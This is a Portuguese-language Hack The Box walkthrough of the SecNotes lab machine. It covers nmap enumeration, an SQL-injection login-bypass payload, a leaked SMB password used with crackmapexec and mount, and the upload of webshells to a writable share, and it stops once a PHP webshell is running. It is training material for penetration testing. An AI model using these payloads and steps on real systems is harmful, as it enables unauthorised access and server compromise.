---
title:     "Hack The Box - SecNotes"
tags: [windows,medium]
categories: HackTheBox
---

![1337.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/1337.jpg)


## Enumeration

Usando o autorecon podemos agilizar o processo

```
# Nmap 7.80 scan initiated Tue Jul 14 12:52:55 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /root/HTB-Windows/secnotes/results/10.10.10.97/scans/_full_tcp_nmap.txt -oX /root/HTB-Windows/secnotes/results/10.10.10.97/scans/xml/_full_tcp_nmap.xml 10.10.10.97
Nmap scan report for 10.10.10.97
Host is up, received user-set (0.40s latency).
Scanned at 2020-07-14 12:52:59 EDT for 920s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=7/14%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5F0DE683%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TI=RD%II=I%TS=U)
SEQ(SP=106%GCD=1%ISR=109%TI=RD%TS=U)
OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m52s, deviation: 4h02m33s, median: -10s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25086/tcp): CLEAN (Timeout)
|   Check 2 (port 9222/tcp): CLEAN (Timeout)
|   Check 3 (port 53444/udp): CLEAN (Timeout)
|   Check 4 (port 51444/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-14T10:07:36-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-14T17:07:30
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   366.33 ms 10.10.14.1
2   385.27 ms 10.10.10.97

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 14 13:08:19 2020 -- 1 IP address (1 host up) scanned in 925.90 seconds
```

Temos entao, 3 portas abertas `80 445 8808`

Navegando ate a porta 80 temos uma tela de login

![22.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/22.jpg)

na port 8808 temos um IIS 10 

![33.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/33.jpg)

Comeco entao pela porta 80, criei um user mas nada de interessante.. Entao resolvi tentar tecnicas de SQLI para bypass de auth

***reference***  https://github.com/payloadbox/sql-injection-payload-list

Usando a primeiro payload encontrado na aba `SQL Injection Auth Bypass Payloads` 

```
login: '-' password: 123456
```

Consigo acesso a informacoes com um nivel mais elevado e uma das notas encontro um login 

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/2.jpg)

com essa cred tento entao acesso ao SMB usando crackmapexec 

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

`crackmapexec smb 10.10.10.97 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares`

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/3.jpg)

Conseguimos mais algumas informacoes importantes como a versao do windows e um share com permissao de escrite e leitura

Em seguida monto entao esse share no meu kali

***reference*** https://book.hacktricks.xyz/pentesting/pentesting-smb

`mount -t cifs -o username=tyler,password='92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site /mnt/new-site`

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/5.jpg)

Lembra? eu tenho permissao de escrita.. fiz um teste entao escrevendo um arquivo de texto simples e acessando ele na porta 8808 `http://10.10.10.97:8808/anakein.txt` tentei tbm escrever uma webshell bem conhecida Antak

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/6.jpg)

Veja, a webshell nao carregava mais o arquivo de texto sim. 

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/7.jpg)

 de imediato fiquei tentando fazer bypass e usar outras tecnicas mas sem sucesso
 
 ![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/9.jpg)

 depois de enviar uma webshell em `.php` tive sucesso
 
 aah. mas antes disso eu observei que o arquivo enviado depois de alguns minutos era apagado...
 
![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/8.jpg)
 
 continuandoo..
 
 depois de enviar uma webshell em PHP rapidamente tenho uma webshell ativa...
 
![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/10.jpg)

 

